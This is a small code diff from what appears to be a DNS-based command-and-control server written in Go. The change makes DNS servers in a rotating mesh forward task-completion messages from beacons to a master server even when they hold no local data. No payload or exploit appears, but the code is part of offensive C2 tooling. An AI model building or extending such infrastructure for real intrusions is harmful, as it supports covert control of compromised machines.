@@ -1756,10 +1756,10 @@ func (c2 *C2Manager) handleResultComplete(parts []string, isDuplicate bool) stri
 	hasBufferedChunks := len(c2.resultBatchBuffer[taskID]) > 0
 	c2.mutex.Unlock()
 
-	// If we never submitted data and have no buffered chunks, another DNS server will handle completion
+	// Even if this server never submitted data, still forward completion to Master.
+	// Domain rotation can send the single chunk to one server and RESULT_COMPLETE to another.
 	if !submittedData && !hasBufferedChunks {
-		logf("[C2] Task %s has no data on this DNS server, skipping completion (handled by another server in mesh)", taskID)
-		return "ACK"
+		logf("[C2] Task %s has no local data, forwarding completion to Master (likely handled by peer)", taskID)
 	}
 
 	// Clear beacon's current task
